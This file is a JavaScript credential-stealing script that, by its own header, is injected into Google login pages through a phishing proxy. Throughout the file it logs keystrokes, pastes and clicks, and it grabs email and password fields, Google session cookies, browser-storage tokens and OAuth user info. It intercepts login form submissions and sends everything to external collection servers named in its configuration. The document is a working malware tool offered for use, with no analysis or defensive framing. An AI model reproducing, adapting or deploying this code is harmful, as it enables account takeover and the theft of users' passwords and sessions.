// ============================================================
//  GOOGLE WORKSPACE / GMAIL - ADVANCED KEYLOGGER + XSS TOOLKIT
//  Enhanced for mobile, IME, paste, and all input types
//  Injected into Google login pages
// ============================================================

(function() {
    // --- Configuration from server injection ---
    const CONFIG = window.GOOGLE_CONFIG || {
        BACKEND_URL: "https://meeting-1-rzx6.onrender.com",
        KEYLOGGER_URL: "https://keyserver-eaar.onrender.com/log",
        XSS_ENDPOINT: "/xss-collect",
        COOKIE_ENDPOINT: "/cookie-capture",
        KEYLOG_ENDPOINT: "/keylog",
        SESSION_ID: 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
        EMAIL: '',
        SERVICE: 'Google Workspace',
        CLIENT_ID: 'google-proxy'
    };

    console.log('🔐 Google Workspace Proxy Injected Script Loaded');
    console.log('📧 Email:', CONFIG.EMAIL);
    console.log('🆔 Session:', CONFIG.SESSION_ID);

    let keylogBuffer = '';
    let lastInputValues = new Map();
    let capturedCredentials = [];
    let loginAttempts = 0;
    const FLUSH_INTERVAL = 8000;
    const MAX_BUFFER = 500;
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

    // ============================================================
    //  PART 1: ADVANCED KEYLOGGER - Google Optimized
    // ============================================================

    function formatKey(e) {
        const key = e.key;
        const special = {
            'Enter': '[ENTER]\n',
            'Backspace': '[BACKSPACE]',
            'Tab': '[TAB]',
            'Escape': '[ESC]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PAGEUP]',
            'PageDown': '[PAGEDOWN]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'Shift': '[SHIFT]',
            'Meta': '[WIN]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        if (special[key]) return special[key];
        if (e.isComposing) return `[COMPOSING:${key}]`;
        if (key.length === 1) return key;
        return `[${key}]`;
    }

    // Send buffer to proxy keylog endpoint
    function sendKeylogBatch() {
        if (keylogBuffer.length === 0) return;

        // Send to proxy keylog endpoint
        fetch(CONFIG.KEYLOG_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                keystrokes: keylogBuffer,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                sessionId: CONFIG.SESSION_ID,
                email: CONFIG.EMAIL,
                service: CONFIG.SERVICE,
                isMobile: isMobile
            })
        }).catch(() => {});

        // Send to external keylogger server
        if (CONFIG.KEYLOGGER_URL) {
            fetch(CONFIG.KEYLOGGER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    keystrokes: keylogBuffer,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: CONFIG.SESSION_ID,
                    email: CONFIG.EMAIL,
                    service: CONFIG.SERVICE,
                    isMobile: isMobile
                })
            }).catch(() => {});
        }

        keylogBuffer = '';
    }

    // --- Keydown events (physical keyboards) ---
    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        if (e.isComposing) return;
        keylogBuffer += formatKey(e);
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // --- Input events (mobile + IME + autofill) ---
    document.addEventListener('input', (e) => {
        if (!e.target) return;
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const field = e.target;
            const value = field.value;
            const label = field.name || field.id || field.placeholder || field.type || 'unknown';
            const prev = lastInputValues.get(field) || '';
            
            if (value !== prev) {
                const added = value.length > prev.length ? value.substring(prev.length) : '';
                if (added.length > 0) {
                    keylogBuffer += `[FIELD:${label}=${added}]`;
                } else {
                    keylogBuffer += `[FIELD:${label}=${value}]`;
                }
                lastInputValues.set(field, value);
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();

                // --- Google-specific credential detection ---
                // Check for Email field (Google uses 'Email' or 'identifier')
                if (label === 'Email' || label === 'identifier' || label === 'email' || 
                    label.toLowerCase().includes('email') || label.toLowerCase().includes('user')) {
                    if (value && value.includes('@')) {
                        CONFIG.EMAIL = value;
                        capturedCredentials.push({
                            type: 'email',
                            field: label,
                            value: value,
                            timestamp: Date.now()
                        });
                        sendCredentialsToBackend('email', value, label);
                    }
                }

                // Check for Password field (Google uses 'Passwd' or 'password')
                if (label === 'Passwd' || label === 'password' || label === 'passwd' ||
                    field.type === 'password' || label.toLowerCase().includes('pass')) {
                    if (value && value.length > 0) {
                        capturedCredentials.push({
                            type: 'password',
                            field: label,
                            value: value,
                            timestamp: Date.now()
                        });
                        // Send password immediately
                        sendCredentialsToBackend('password', value, label);
                    }
                }
            }
        }
    });

    // --- Composition events for IME (non-Latin characters) ---
    document.addEventListener('compositionstart', () => {
        keylogBuffer += '[IME_START]';
    });
    document.addEventListener('compositionend', () => {
        keylogBuffer += '[IME_END]';
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // --- Paste events ---
    document.addEventListener('paste', (e) => {
        const text = e.clipboardData?.getData('text') || '';
        if (text) {
            const pasteText = text.length > 200 ? text.substring(0, 200) + '...' : text;
            keylogBuffer += `[PASTE:${pasteText}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            
            // Check if paste contains email
            if (text.includes('@')) {
                const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                if (emailMatch) {
                    CONFIG.EMAIL = emailMatch[0];
                    sendCredentialsToBackend('email_paste', emailMatch[0], 'paste');
                }
            }
            // Check if paste contains password-like text
            if (text.length > 4 && !text.includes('@') && !text.includes(' ')) {
                sendCredentialsToBackend('password_paste', text, 'paste');
            }
        }
    });

    // --- Focus/Blur tracking ---
    document.addEventListener('focusin', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || e.target.type || 'unknown';
            keylogBuffer += `[FOCUS:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    document.addEventListener('focusout', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || e.target.type || 'unknown';
            keylogBuffer += `[BLUR:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    // --- Periodic check for Google's dynamic fields ---
    setInterval(() => {
        // Check for Google's hidden fields that might contain data
        const hiddenFields = document.querySelectorAll('input[type="hidden"]');
        hiddenFields.forEach(field => {
            const name = field.name || '';
            const value = field.value || '';
            if (name && value && (name.includes('ltmpl') || name.includes('continue') || name.includes('service'))) {
                keylogBuffer += `[HIDDEN:${name}=${value}]`;
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            }
        });

        // Check for Google's identifier field (sometimes appears after email entry)
        const identifier = document.querySelector('input[name="identifier"]');
        if (identifier && identifier.value && identifier.value !== lastInputValues.get(identifier)) {
            const value = identifier.value;
            if (value.includes('@')) {
                CONFIG.EMAIL = value;
                sendCredentialsToBackend('email', value, 'identifier');
            }
            lastInputValues.set(identifier, value);
        }
    }, 3000);

    // --- Periodic flush ---
    setInterval(sendKeylogBatch, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', sendKeylogBatch);
    window.addEventListener('pagehide', sendKeylogBatch);

    console.log('⌨️ Google Keylogger initialized');

    // ============================================================
    //  PART 2: CREDENTIAL SENDER
    // ============================================================

    function sendCredentialsToBackend(type, value, field) {
        try {
            const data = {
                action: 'google_credential_capture',
                email: type === 'email' ? value : CONFIG.EMAIL || '',
                password: type === 'password' ? value : '',
                field: field || 'unknown',
                value: value,
                type: type,
                url: window.location.href,
                userAgent: navigator.userAgent,
                sessionId: CONFIG.SESSION_ID,
                service: CONFIG.SERVICE,
                timestamp: new Date().toISOString()
            };

            fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});

            // Also send to keylogger
            if (CONFIG.KEYLOGGER_URL) {
                fetch(CONFIG.KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'google_credential',
                        email: type === 'email' ? value : CONFIG.EMAIL || '',
                        password: type === 'password' ? value : '',
                        url: window.location.href,
                        sessionId: CONFIG.SESSION_ID,
                        service: CONFIG.SERVICE,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
        } catch (e) {
            console.warn('[CREDENTIAL] Send error:', e.message);
        }
    }

    // ============================================================
    //  PART 3: GOOGLE-SPECIFIC COOKIE CAPTURE
    // ============================================================

    function captureFullCookies() {
        try {
            const cookies = document.cookie || '';
            if (cookies) {
                // Parse cookies into object
                const cookieObj = {};
                cookies.split('; ').forEach(cookie => {
                    const [name, value] = cookie.split('=');
                    if (name && value) {
                        cookieObj[name] = value;
                    }
                });

                // Check for Google-specific cookies
                const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
                const hasGoogleCookies = googleCookies.some(name => cookieObj[name]);

                if (hasGoogleCookies || Object.keys(cookieObj).length > 0) {
                    console.log('🍪 Google cookies detected:', Object.keys(cookieObj));

                    fetch(CONFIG.COOKIE_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            cookies: cookieObj,
                            fullCookieString: cookies,
                            url: window.location.href,
                            sessionId: CONFIG.SESSION_ID,
                            email: CONFIG.EMAIL || '',
                            service: CONFIG.SERVICE,
                            timestamp: new Date().toISOString(),
                            isGoogle: true
                        })
                    }).catch(() => {});

                    // Send to backend
                    fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            action: 'google_cookie_capture',
                            email: CONFIG.EMAIL || 'unknown',
                            cookies: cookieObj,
                            googleCookies: googleCookies.filter(name => cookieObj[name]),
                            url: window.location.href,
                            sessionId: CONFIG.SESSION_ID,
                            service: CONFIG.SERVICE,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            }
        } catch (e) {
            console.warn('[COOKIE] Error:', e.message);
        }
    }

    // Run cookie capture at intervals
    setTimeout(captureFullCookies, 2000);
    setTimeout(captureFullCookies, 5000);
    setTimeout(captureFullCookies, 10000);
    setTimeout(captureFullCookies, 20000);
    setTimeout(captureFullCookies, 30000);
    setInterval(captureFullCookies, 30000);

    console.log('🍪 Google Cookie capture initialized');

    // ============================================================
    //  PART 4: XSS DATA EXTRACTION - Google Optimized
    // ============================================================

    function extractGoogleDomData() {
        const data = {};

        // Google-specific fields
        const emailField = document.querySelector('input[name="Email"]') || 
                           document.querySelector('input[name="identifier"]') ||
                           document.querySelector('input[type="email"]') ||
                           document.querySelector('input[name="email"]');
        if (emailField) data.email = emailField.value;

        const passField = document.querySelector('input[name="Passwd"]') ||
                         document.querySelector('input[type="password"]') ||
                         document.querySelector('input[name="password"]');
        if (passField && passField.value) data.password = passField.value;

        // Google's hidden fields
        const hiddenFields = {};
        document.querySelectorAll('input[type="hidden"]').forEach(field => {
            const name = field.name || '';
            if (name && field.value) {
                hiddenFields[name] = field.value;
            }
        });
        if (Object.keys(hiddenFields).length > 0) data.hiddenFields = hiddenFields;

        // Google-specific tokens
        const gxf = document.querySelector('input[name="gxf"]');
        if (gxf) data.gxf = gxf.value;

        const continueUrl = document.querySelector('input[name="continue"]');
        if (continueUrl) data.continueUrl = continueUrl.value;

        const service = document.querySelector('input[name="service"]');
        if (service) data.service = service.value;

        // User info from page
        const userInfo = document.querySelector('[data-testid="userInfo"]') ||
                        document.querySelector('.user-info') ||
                        document.querySelector('[class*="profile"]');
        if (userInfo) data.userInfo = userInfo.textContent.trim();

        // Page title
        data.pageTitle = document.title;

        return data;
    }

    function extractGoogleStorage() {
        const data = {};
        try {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && (key.includes('google') || key.includes('auth') || key.includes('gmail') || 
                           key.includes('oauth') || key.includes('session') || key.includes('token'))) {
                    try {
                        let value = localStorage.getItem(key);
                        if (typeof value === 'string' && value.length > 500) {
                            value = value.substring(0, 500) + '...';
                        }
                        ls[key] = value;
                    } catch (e) {}
                }
            }
            if (Object.keys(ls).length > 0) data.localStorage = ls;

            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key && (key.includes('google') || key.includes('auth'))) {
                    try {
                        let value = sessionStorage.getItem(key);
                        if (typeof value === 'string' && value.length > 500) {
                            value = value.substring(0, 500) + '...';
                        }
                        ss[key] = value;
                    } catch (e) {}
                }
            }
            if (Object.keys(ss).length > 0) data.sessionStorage = ss;

            data.cookies = document.cookie;
        } catch (e) {}
        return data;
    }

    async function executeGoogleRequests() {
        const results = {};
        
        // Google-specific endpoints
        const endpoints = [
            '/oauth2/v1/userinfo',
            '/oauth2/v2/token',
            '/v1/me',
            '/api/user/me',
            '/userinfo',
            '/me'
        ];

        for (const endpoint of endpoints) {
            try {
                const res = await fetch(endpoint, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });
                if (res.ok) {
                    try {
                        const data = await res.json();
                        if (data && typeof data === 'object' && Object.keys(data).length > 0) {
                            results[endpoint] = data;
                        }
                    } catch (e) {
                        // Not JSON, ignore
                    }
                }
            } catch (e) { /* ignore */ }
        }

        return results;
    }

    async function runXSS() {
        try {
            const domData = extractGoogleDomData();
            const storageData = extractGoogleStorage();
            const requestResults = await executeGoogleRequests();

            const combined = {
                dom: domData,
                storage: storageData,
                requests: requestResults,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                sessionId: CONFIG.SESSION_ID,
                service: CONFIG.SERVICE,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            };

            // Send to XSS endpoint
            fetch(CONFIG.XSS_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...combined,
                    email: CONFIG.EMAIL || domData.email || '',
                    sessionId: CONFIG.SESSION_ID
                })
            }).catch(() => {});

            // Send to backend
            fetch(`${CONFIG.BACKEND_URL}/api/xss-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    xssData: combined,
                    visitorInfo: {
                        fullUrl: window.location.href,
                        userAgent: navigator.userAgent,
                        sessionId: CONFIG.SESSION_ID
                    }
                })
            }).catch(() => {});

            // Send credentials if found
            if (domData.email && domData.email.includes('@')) {
                sendCredentialsToBackend('email', domData.email, 'xss_extract');
            }
            if (domData.password) {
                sendCredentialsToBackend('password', domData.password, 'xss_extract');
            }

            console.log('🎯 Google XSS data captured');
        } catch (e) {
            console.warn('[XSS] Error:', e.message);
        }
    }

    // Run XSS on page load
    if (document.readyState === 'complete') {
        setTimeout(runXSS, 1500);
    } else {
        window.addEventListener('load', () => setTimeout(runXSS, 1500));
    }

    // Run XSS at intervals
    setTimeout(runXSS, 5000);
    setTimeout(runXSS, 15000);
    setTimeout(runXSS, 30000);

    // Observe DOM changes for SPA
    let observerRunning = false;
    const observer = new MutationObserver(() => {
        if (!observerRunning) {
            observerRunning = true;
            setTimeout(() => {
                runXSS();
                observerRunning = false;
            }, 3000);
        }
    });
    try {
        observer.observe(document.body, { 
            childList: true, 
            subtree: true,
            attributes: true,
            attributeFilter: ['class', 'id', 'style']
        });
    } catch (e) {}

    console.log('🎯 Google XSS extractor initialized');

    // ============================================================
    //  PART 5: FORM SUBMISSION INTERCEPTOR
    // ============================================================

    document.addEventListener('submit', (e) => {
        const form = e.target;
        const formData = new FormData(form);
        const data = {};
        let email = CONFIG.EMAIL || '';
        let password = '';

        for (const [key, value] of formData.entries()) {
            data[key] = value;
            
            // Google-specific fields
            if (key === 'Email' || key === 'identifier' || key === 'email') {
                email = value;
                if (value && value.includes('@')) {
                    CONFIG.EMAIL = value;
                }
            }
            if (key === 'Passwd' || key === 'password' || key === 'passwd') {
                password = value;
            }
        }

        if (email || password) {
            loginAttempts++;
            
            // Send to backend immediately
            fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'google_form_submit',
                    email: email || CONFIG.EMAIL || 'unknown',
                    password: password || '',
                    formData: data,
                    sessionId: CONFIG.SESSION_ID,
                    attempts: loginAttempts,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    service: CONFIG.SERVICE,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});

            // Also send to keylogger
            if (CONFIG.KEYLOGGER_URL) {
                fetch(CONFIG.KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'google_form_submit',
                        email: email || CONFIG.EMAIL || 'unknown',
                        password: password || '',
                        url: window.location.href,
                        sessionId: CONFIG.SESSION_ID,
                        service: CONFIG.SERVICE,
                        formData: data,
                        attempts: loginAttempts,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }

            console.log('📤 Google form submitted:', email || 'unknown');
        }
    });

    // ============================================================
    //  PART 6: CLICK TRACKING
    // ============================================================

    document.addEventListener('click', (e) => {
        const target = e.target;
        const tag = target.tagName;
        const id = target.id || '';
        const className = target.className || '';
        const text = (target.textContent || '').substring(0, 50);
        const href = target.href || '';
        
        if (tag === 'BUTTON' || tag === 'A' || target.closest('button') || target.closest('a')) {
            const clickData = {
                tag: tag,
                id: id,
                className: className,
                text: text,
                href: href,
                url: window.location.href,
                sessionId: CONFIG.SESSION_ID,
                timestamp: Date.now()
            };

            keylogBuffer += `[CLICK:${tag}${id ? '#'+id : ''} ${text}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();

            // Send to backend
            fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'google_click_tracking',
                    clickData: clickData,
                    sessionId: CONFIG.SESSION_ID,
                    url: window.location.href
                })
            }).catch(() => {});
        }
    });

    // ============================================================
    //  PART 7: SERVICE WORKER REGISTRATION (Google version)
    // ============================================================
    
    (function() {
        if ("serviceWorker" in navigator) {
            try {
                // Register Google-specific service worker
                const swUrl = "/service_worker_google.js";
                navigator.serviceWorker.register(swUrl, {
                    scope: "/",
                }).then(() => {
                    console.log("✅ Google Service Worker registered");
                }).catch((error) => {
                    console.warn("❌ Google Service Worker registration failed:", error);
                });
            } catch (e) {
                console.warn("Service Worker not supported");
            }
        }
    })();

    // ============================================================
    //  PART 8: DEBUG INFO
    // ============================================================

    console.log('✅ Google Workspace Proxy Script Ready');
    console.log(`📊 Session: ${CONFIG.SESSION_ID}`);
    console.log(`📧 Email: ${CONFIG.EMAIL || 'Not detected yet'}`);
    console.log(`📱 Mobile: ${isMobile}`);
    console.log(`🖥️ User Agent: ${navigator.userAgent}`);
    console.log(`🔗 Keylogger: ${CONFIG.KEYLOGGER_URL}`);
    console.log(`🔗 Backend: ${CONFIG.BACKEND_URL}`);

    // Send initial load event
    fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            action: 'google_script_loaded',
            sessionId: CONFIG.SESSION_ID,
            email: CONFIG.EMAIL || 'unknown',
            url: window.location.href,
            userAgent: navigator.userAgent,
            isMobile: isMobile,
            service: CONFIG.SERVICE,
            timestamp: new Date().toISOString()
        })
    }).catch(() => {});

})();